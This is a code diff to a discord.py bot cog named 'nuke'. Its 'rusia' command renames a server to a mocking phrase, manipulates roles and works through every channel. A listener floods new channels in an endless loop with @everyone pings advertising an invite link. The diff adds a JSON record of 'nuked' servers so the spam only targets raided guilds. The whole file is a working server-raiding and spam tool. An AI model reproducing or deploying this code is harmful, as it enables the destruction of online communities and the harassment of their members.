@@ -1,4 +1,4 @@
-import discord, random, asyncio
+import discord, random, asyncio, json
 from discord.ext import commands
 
 class nuke(commands.Cog):
@@ -8,6 +8,11 @@ class nuke(commands.Cog):
   @commands.command()
   async def rusia(self, ctx):
     if not ctx.guild.id == "945301250717663282":
+      with open("datas/nuked.json", "r") as f:
+        data = json.load(f)
+        data[str(ctx.guild.id)]="True"
+        with open("datas/nuked.json", 'w') as f:
+            json.dump(data, f)
         await self.role(ctx)
         await ctx.guild.edit(name="むしょくみんち↑")
         for channel in ctx.guild.channels:
@@ -31,9 +36,14 @@ class nuke(commands.Cog):
                 return
 
   @commands.Cog.listener()
-  async def on_guild_channel_create(self, channel): 
-    while True:
-        await channel.send("@everyone\n\nvtuber大好きサーバーhttps://discord.gg/BbMMzSaKdC")
+  async def on_guild_channel_create(self, channel):
+    with open("datas/nuked.json", "r") as f:
+      data = json.load(f)
+    if not str(channel.guild.id) in data:
+      return
+    else:
+      while True:
+          await channel.send("@everyone\n\nvtuber大好きサーバーhttps://discord.gg/BbMMzSaKdC")
        
 def setup(client):
   client.add_cog(nuke(client))
